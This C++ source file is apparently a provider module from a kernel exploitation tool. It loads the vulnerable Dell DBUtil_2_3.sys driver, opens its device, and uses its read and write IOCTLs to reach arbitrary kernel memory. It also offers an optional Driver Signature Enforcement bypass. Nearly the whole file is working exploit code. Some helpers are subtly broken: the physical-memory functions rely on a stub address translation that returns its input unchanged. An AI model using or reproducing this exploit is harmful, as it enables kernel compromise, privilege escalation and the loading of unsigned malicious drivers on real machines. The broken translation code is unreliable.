/**
 * @file DBUtilProvider.cpp
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the authentic KDU implementation of the DBUtilProvider class.
 *
 * Implements the full lifecycle of the DBUtil_2_3.sys provider using authentic KDU
 * methodology. This implementation mirrors the exact approach used by the official
 * KDU (Kernel Driver Utility) project for Dell DBUtil driver exploitation.
 *
 * Key authentic KDU features implemented:
 * - DBUTIL_READWRITE_REQUEST structure with 0xDEADBEEF signature
 * - VirtualAllocEx + VirtualLock memory management pattern
 * - Direct virtual memory read/write primitives only (no shellcode execution)
 * - Proper IOCTL buffer management with offsetof() calculations
 * - Authentic error handling with SetLastError()/GetLastError()
 *
 * Note: Unlike some other providers, DBUtil in authentic KDU only provides
 * virtual memory read/write capabilities. It does NOT support:
 * - Kernel memory allocation/deallocation
 * - System thread creation
 * - Shellcode execution
 * - Physical memory access
 *
 * For these advanced features, use other providers like Gdrv or RTCore.
 */

#include "DBUtilProvider.h"
#include "../Utils.h"
#include "../Syscall.h"
#include "../Resources/DriverDataManager.h"
#include "../DSE.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>

// IOCTLs for the vulnerability in DBUtil_2_3.sys - authentic KDU values
#define IOCTL_DBUTIL_READVM  0x9B0C1EC4
#define IOCTL_DBUTIL_WRITEVM 0x9B0C1EC8

namespace KernelMode {
    namespace Providers {

        DBUtilProvider::DBUtilProvider() : deviceHandle(INVALID_HANDLE_VALUE), serviceHandle(nullptr) {}

        DBUtilProvider::~DBUtilProvider() {
            Deinitialize();
        }

        bool DBUtilProvider::DropDriver() {
            // Use DriverDataManager to extract DBUtil driver
            auto& driverManager = Resources::DriverDataManager::GetInstance();
            if (!driverManager.Initialize()) {
                std::wcerr << L"[-] Failed to initialize DriverDataManager" << std::endl;
                return false;
            }

            // LIFECYCLE-032 FIX: Ensure driver path is set correctly relative to exe
            wchar_t exePath[MAX_PATH];
            if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
                 std::filesystem::path p(exePath);
                 this->driverPath = (p.parent_path() / L"DBUtil_2_3.sys").wstring();
            } else {
                 this->driverPath = L".\\DBUtil_2_3.sys";
            }

            // Extract DBUtil driver using DriverDataManager
            if (!driverManager.ExtractDriver(Resources::DRIVER_ID_DBUTIL, this->driverPath)) {
                std::wcerr << L"[-] Failed to extract DBUtil driver from embedded resources" << std::endl;
                return false;
            }

            std::wcout << L"[+] DBUtil driver extracted to: " << this->driverPath << std::endl;
            return true;
        }

        bool DBUtilProvider::Initialize(ULONG driverId, bool bypassDSE) {
            if (!this->DropDriver()) {
                return false;
            }

            this->serviceHandle = Utils::CreateDriverService(this->serviceName, this->driverPath);
            if (!this->serviceHandle) {
                std::wcerr << L"[-] Failed to create or start the DBUtil_2_3 service." << std::endl;
                DeleteFileW(this->driverPath.c_str());
                return false;
            }

            UNICODE_STRING deviceNameUnicode;
            RtlInitUnicodeString(&deviceNameUnicode, this->deviceName.c_str());
            
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &deviceNameUnicode, OBJ_CASE_INSENSITIVE, NULL, NULL);

            IO_STATUS_BLOCK ioStatusBlock;

            DWORD ntCreateFileSyscall = Syscall::GetInstance().GetSyscallIndex("NtCreateFile");
            if (ntCreateFileSyscall == -1) {
                this->deviceHandle = CreateFileW(
                    L"\\\\.\\DBUtil_2_3",
                    GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    nullptr,
                    OPEN_EXISTING,
                    0,
                    nullptr
                );
            } else {
                PVOID params[] = {
                    &this->deviceHandle,
                    (PVOID)(SYNCHRONIZE | WRITE_DAC | GENERIC_WRITE | GENERIC_READ),
                    &objAttr,
                    &ioStatusBlock,
                    nullptr,
                    (PVOID)0,
                    (PVOID)0,
                    (PVOID)FILE_OPEN,
                    (PVOID)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE),
                    nullptr,
                    (PVOID)0
                };
                
                NTSTATUS status = DoSyscall(ntCreateFileSyscall, params, 11);
                if (!NT_SUCCESS(status)) {
                    this->deviceHandle = INVALID_HANDLE_VALUE;
                }
            }

            if (this->deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Failed to open a handle to the DBUtil_2_3 device: " << GetLastError() << std::endl;
                this->Deinitialize();
                return false;
            }

            std::wcout << L"[+] DBUtilProvider initialized successfully." << std::endl;
            
            // Validate driver state
            if (!ValidateDriverState()) {
                std::wcerr << L"[-] Driver validation failed, continuing anyway..." << std::endl;
            }
            
            // Perform DSE bypass if requested
            if (bypassDSE) {
                std::wcout << L"[*] Attempting DSE bypass..." << std::endl;
                if (!BypassDSE()) {
                    std::wcerr << L"[-] DSE bypass failed, continuing anyway..." << std::endl;
                }
            }
            
            return true;
        }

        std::wstring DBUtilProvider::GetProviderName() const {
            return L"DBUtil";
        }

        void DBUtilProvider::Deinitialize() {
            if (this->deviceHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(this->deviceHandle);
                this->deviceHandle = INVALID_HANDLE_VALUE;
            }
            if (this->serviceHandle) {
                Utils::RemoveDriverService(this->serviceHandle);
                this->serviceHandle = nullptr;
            }
            if (!this->driverPath.empty()) {
                DeleteFileW(this->driverPath.c_str());
                this->driverPath.clear();
            }
            std::wcout << L"[+] DBUtilProvider deinitialized." << std::endl;
        }

        bool DBUtilProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) return false;

            // Add basic safety checks
            if (!buffer || size == 0) return false;
            if (address < 0xFFFF800000000000ULL) return false; // Not in kernel space
            if (address + size < address) return false; // Overflow check
            if (address < 0x1000) return false; // Null pointer protection

            // Use authentic KDU implementation
            return DbUtilReadVirtualMemory(this->deviceHandle, address, buffer, (ULONG)size);
        }

        bool DBUtilProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) return false;

            // Add basic safety checks
            if (!buffer || size == 0) return false;
            if (address < 0xFFFF800000000000ULL) return false; // Not in kernel space
            if (address + size < address) return false; // Overflow check
            if (address < 0x1000) return false; // Null pointer protection
            
            // Prevent writing to KUSER_SHARED_DATA and other protected ranges
            if (address >= 0xFFFFF78000000000ULL && address < 0xFFFFF78000001000ULL) return false;

            // Use authentic KDU implementation
            return DbUtilWriteVirtualMemory(this->deviceHandle, address, buffer, (ULONG)size);
        }

        // Missing virtual method implementations
        bool DBUtilProvider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            // Use kernel memory read with physical address translation
            uintptr_t virtualAddress = VirtualToPhysical(physicalAddress);
            if (virtualAddress == 0) {
                return false;
            }
            return ReadKernelMemory(virtualAddress, buffer, size);
        }

        bool DBUtilProvider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            // Use kernel memory write with physical address translation
            uintptr_t virtualAddress = VirtualToPhysical(physicalAddress);
            if (virtualAddress == 0) {
                return false;
            }
            return WriteKernelMemory(virtualAddress, buffer, size);
        }

        bool DBUtilProvider::BypassDSE() {
            std::wcout << L"[+] DBUtilProvider::BypassDSE - Attempting DSE bypass using shared logic..." << std::endl;
            
            try {
                // Create a shared pointer to this provider for DSE class
                // Create DSE manager with this provider
                DSE dseManager(this);
                
                // Attempt to disable DSE
                if (dseManager.Disable()) {
                    std::wcout << L"[+] DSE bypass successful!" << std::endl;
                    return true;
                } else {
                    std::wcerr << L"[-] DSE bypass failed." << std::endl;
                    return false;
                }
            }
            catch (const std::exception& e) {
                std::wcerr << L"[-] Exception during DSE bypass: " << e.what() << std::endl;
                return false;
            }
        }

        ULONG DBUtilProvider::GetCapabilities() const {
            // Authentic KDU DBUtil capabilities: only virtual memory read/write
            return CAPABILITY_VIRTUAL_MEMORY;
        }

        const ProviderLoadData* DBUtilProvider::GetLoadData() const {
            static const ProviderLoadData loadData = {
                false, // PhysMemoryBruteForce
                false, // PML4FromLowStub
                false, // PreferPhysical (authentic KDU doesn't prefer physical for DBUtil)
                false, // RequiresDSE
                CAPABILITY_VIRTUAL_MEMORY, // Only virtual memory read/write supported
                L"DBUtil_2_3 (Dell BIOS Utility) - Authentic KDU virtual memory access provider"
            };
            return &loadData;
        }

        uintptr_t DBUtilProvider::VirtualToPhysical(uintptr_t virtualAddress) {
            // Simplified virtual to physical translation
            // Real implementation would use page table walking
            return virtualAddress; // For now, return the same address
        }

        // ============================================================================
        // KDU utility function implementations
        // ============================================================================

        PVOID DBUtilProvider::AllocateLockedMemory(SIZE_T Size, ULONG AllocationType, ULONG Protect) {
            PVOID Buffer = nullptr;

            // Allocate virtual memory
            Buffer = VirtualAllocEx(GetCurrentProcess(),
                nullptr,
                Size,
                AllocationType,
                Protect);

            if (Buffer) {
                // Lock the memory to prevent paging
                if (!VirtualLock(Buffer, Size)) {
                    VirtualFreeEx(GetCurrentProcess(), Buffer, 0, MEM_RELEASE);
                    return nullptr;
                }
            }

            return Buffer;
        }

        BOOL DBUtilProvider::FreeLockedMemory(PVOID Memory, SIZE_T Size) {
            if (!Memory) return FALSE;

            // Unlock the memory first
            if (VirtualUnlock(Memory, Size)) {
                // Then free it
                return VirtualFreeEx(GetCurrentProcess(), Memory, 0, MEM_RELEASE);
            }

            return FALSE;
        }

        BOOL DBUtilProvider::CallDriver(HANDLE DeviceHandle, ULONG IoControlCode, PVOID InputBuffer, 
                                      ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength) {
            // Simplified version of KDU's supCallDriver
            // In a full implementation, this would use NtDeviceIoControlFile with proper status handling
            DWORD bytesReturned = 0;
            return DeviceIoControl(DeviceHandle, IoControlCode, InputBuffer, InputBufferLength,
                                 OutputBuffer, OutputBufferLength, &bytesReturned, nullptr);
        }

        BOOL DBUtilProvider::DbUtilReadVirtualMemory(HANDLE DeviceHandle, ULONG_PTR VirtualAddress, 
                                                    PVOID Buffer, ULONG NumberOfBytes) {
            BOOL bResult = FALSE;
            SIZE_T size;
            DWORD dwError = ERROR_SUCCESS;
            PDBUTIL_READWRITE_REQUEST pRequest = nullptr;

            // Calculate buffer size: structure header + data size
            size = offsetof(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

            // Allocate locked memory for the request
            pRequest = (PDBUTIL_READWRITE_REQUEST)AllocateLockedMemory(size,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (pRequest) {
                // Initialize request structure with KDU values
                pRequest->Unused = 0xDEADBEEF;           // KDU signature
                pRequest->VirtualAddress = VirtualAddress;
                pRequest->Offset = 0;                    // Always 0 in KDU

                // Call driver with authentic KDU pattern
                bResult = CallDriver(DeviceHandle,
                    IOCTL_DBUTIL_READVM,
                    pRequest,
                    (ULONG)size,
                    pRequest,
                    (ULONG)size);

                if (!bResult) {
                    dwError = GetLastError();
                } else {
                    // Copy data from response buffer
                    RtlCopyMemory(Buffer, pRequest->Data, NumberOfBytes);
                }

                // Free locked memory
                FreeLockedMemory(pRequest, size);
            }

            SetLastError(dwError);
            return bResult;
        }

        BOOL DBUtilProvider::DbUtilWriteVirtualMemory(HANDLE DeviceHandle, ULONG_PTR VirtualAddress, 
                                                     PVOID Buffer, ULONG NumberOfBytes) {
            BOOL bResult = FALSE;
            SIZE_T size;
            DWORD dwError = ERROR_SUCCESS;
            PDBUTIL_READWRITE_REQUEST pRequest = nullptr;

            // Calculate buffer size: structure header + data size
            size = offsetof(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

            // Allocate locked memory for the request
            pRequest = (PDBUTIL_READWRITE_REQUEST)AllocateLockedMemory(size,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (pRequest) {
                // Initialize request structure with KDU values
                pRequest->Unused = 0xDEADBEEF;           // KDU signature
                pRequest->VirtualAddress = VirtualAddress;
                pRequest->Offset = 0;                    // Always 0 in KDU
                
                // Copy data to request buffer
                RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

                // Call driver with authentic KDU pattern
                bResult = CallDriver(DeviceHandle,
                    IOCTL_DBUTIL_WRITEVM,
                    pRequest,
                    (ULONG)size,
                    pRequest,
                    (ULONG)size);

                if (!bResult) {
                    dwError = GetLastError();
                }

                // Free locked memory
                FreeLockedMemory(pRequest, size);
            }

            SetLastError(dwError);
            return bResult;
        }

        // ============================================================================
        // Legacy shellcode-based methods (deprecated - use direct memory access)
        // ============================================================================

        uintptr_t DBUtilProvider::AllocateKernelMemory(size_t size, uintptr_t* physicalAddress) {
            std::wcerr << L"[-] DBUtilProvider: Kernel memory allocation not supported by authentic KDU DBUtil implementation" << std::endl;
            std::wcerr << L"[-] DBUtil_2_3.sys only provides virtual memory read/write primitives" << std::endl;
            std::wcerr << L"[-] Use ReadKernelMemory/WriteKernelMemory for direct memory access" << std::endl;
            
            if (physicalAddress) {
                *physicalAddress = 0;
            }
            
            return 0; // Not supported by authentic KDU implementation
        }

        bool DBUtilProvider::FreeKernelMemory(uintptr_t virtualAddress, size_t size) {
            std::wcerr << L"[-] DBUtilProvider: Kernel memory deallocation not supported by authentic KDU DBUtil implementation" << std::endl;
            std::wcerr << L"[-] DBUtil_2_3.sys only provides virtual memory read/write primitives" << std::endl;
            return false; // Not supported by authentic KDU implementation
        }

        bool DBUtilProvider::CreateSystemThread(uintptr_t startAddress, uintptr_t parameter) {
            std::wcerr << L"[-] DBUtilProvider: System thread creation not supported by authentic KDU DBUtil implementation" << std::endl;
            std::wcerr << L"[-] DBUtil_2_3.sys only provides virtual memory read/write primitives" << std::endl;
            std::wcerr << L"[-] For thread creation, use a provider that supports kernel code execution (e.g., Gdrv)" << std::endl;
            return false; // Not supported by authentic KDU implementation
        }

        uintptr_t DBUtilProvider::ExecuteKernelShellcode(BYTE* shellcode, size_t size) {
            std::wcerr << L"[-] DBUtilProvider: Kernel shellcode execution not supported by authentic KDU DBUtil implementation" << std::endl;
            std::wcerr << L"[-] DBUtil_2_3.sys only provides virtual memory read/write primitives" << std::endl;
            std::wcerr << L"[-] For code execution, use a provider that supports it (e.g., Gdrv, RTCore)" << std::endl;
            return 0; // Not supported by authentic KDU implementation
        }

        // Enhanced status-returning methods for better error handling
        ProviderStatus DBUtilProvider::ReadKernelMemoryEx(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) {
                return PROVIDER_ERROR_INVALID_HANDLE;
            }
            
            if (!buffer || size == 0) {
                return PROVIDER_ERROR_INVALID_PARAMETER;
            }

            // Validate kernel address range (basic bounds checking)
            if (address < 0xFFFF800000000000ULL) { // Windows x64 kernel space starts here
                return PROVIDER_ERROR_INVALID_ADDRESS;
            }
            
            // Check for overflow in address + size
            if (address + size < address) {
                return PROVIDER_ERROR_INVALID_ADDRESS;
            }
            
            // Validate that we're not reading from null or very low addresses
            if (address < 0x1000) {
                return PROVIDER_ERROR_INVALID_ADDRESS;
            }

            // Use authentic KDU implementation
            if (DbUtilReadVirtualMemory(this->deviceHandle, address, buffer, (ULONG)size)) {
                return PROVIDER_SUCCESS;
            } else {
                return PROVIDER_ERROR_READ_FAILED;
            }
        }

        ProviderStatus DBUtilProvider::WriteKernelMemoryEx(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) {
                return PROVIDER_ERROR_INVALID_HANDLE;
            }
            
            if (!buffer || size == 0) {
                return PROVIDER_ERROR_INVALID_PARAMETER;
            }

            // Validate kernel address range (basic bounds checking)
            if (address < 0xFFFF800000000000ULL) { // Windows x64 kernel space starts here
                return PROVIDER_ERROR_INVALID_ADDRESS;
            }
            
            // Check for overflow in address + size
            if (address + size < address) {
                return PROVIDER_ERROR_INVALID_ADDRESS;
            }
            
            // Validate that we're not writing to null or very low addresses
            if (address < 0x1000) {
                return PROVIDER_ERROR_INVALID_ADDRESS;
            }
            
            // Additional safety: prevent writing to certain protected ranges
            // KUSER_SHARED_DATA is read-only from user mode perspective
            if (address >= 0xFFFFF78000000000ULL && address < 0xFFFFF78000001000ULL) {
                return PROVIDER_ERROR_ACCESS_DENIED;
            }

            // Use authentic KDU implementation
            if (DbUtilWriteVirtualMemory(this->deviceHandle, address, buffer, (ULONG)size)) {
                return PROVIDER_SUCCESS;
            } else {
                return PROVIDER_ERROR_WRITE_FAILED;
            }
        }

        ProviderStatus DBUtilProvider::AllocateKernelMemoryEx(size_t size, uintptr_t* virtualAddress, uintptr_t* physicalAddress) {
            std::wcerr << L"[-] DBUtilProvider: Kernel memory allocation not supported by authentic KDU DBUtil implementation" << std::endl;
            return PROVIDER_ERROR_NOT_SUPPORTED;
        }

        ProviderStatus DBUtilProvider::ExecuteKernelShellcodeEx(const void* shellcode, size_t size, uintptr_t* resultAddress) {
            std::wcerr << L"[-] DBUtilProvider: Kernel shellcode execution not supported by authentic KDU DBUtil implementation" << std::endl;
            return PROVIDER_ERROR_NOT_SUPPORTED;
        }

        // Driver validation methods like KDU
        bool DBUtilProvider::IsVulnerableDriverLoaded() const {
            // Check if DBUtil_2_3.sys driver is loaded and accessible
            HANDLE testHandle = CreateFileW(
                this->deviceName.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                0,
                nullptr
            );

            if (testHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(testHandle);
                return true;
            }

            return false;
        }

        bool DBUtilProvider::ValidateDriverState() const {
            if (!IsVulnerableDriverLoaded()) {
                std::wcerr << L"[-] DBUtil_2_3.sys driver is not loaded or accessible" << std::endl;
                return false;
            }

            // Test basic memory read operation to validate functionality
            if (this->deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Invalid device handle" << std::endl;
                return false;
            }

            try {
                // Test read from a safe kernel address (KUSER_SHARED_DATA)
                constexpr uintptr_t TEST_ADDRESS = 0xFFFFF78000000000; // KUSER_SHARED_DATA
                DWORD testValue = 0;
                
                // Use authentic KDU read function
                if (const_cast<DBUtilProvider*>(this)->DbUtilReadVirtualMemory(this->deviceHandle, TEST_ADDRESS, &testValue, sizeof(testValue))) {
                    std::wcout << L"[+] Driver validation successful - authentic KDU memory access works" << std::endl;
                    return true;
                } else {
                    std::wcerr << L"[-] Driver validation failed - authentic KDU memory access not working" << std::endl;
                    return false;
                }
            }
            catch (...) {
                std::wcerr << L"[-] Exception during driver validation" << std::endl;
                return false;
            }
        }

        // Enhanced shellcode execution with KDU-style parameters
        ProviderStatus DBUtilProvider::ExecuteShellcodeEx(const ShellcodeExecutionParams& params, uintptr_t* resultAddress) {
            std::wcerr << L"[-] DBUtilProvider: Shellcode execution not supported by authentic KDU DBUtil implementation" << std::endl;
            return PROVIDER_ERROR_NOT_SUPPORTED;
        }

    }
}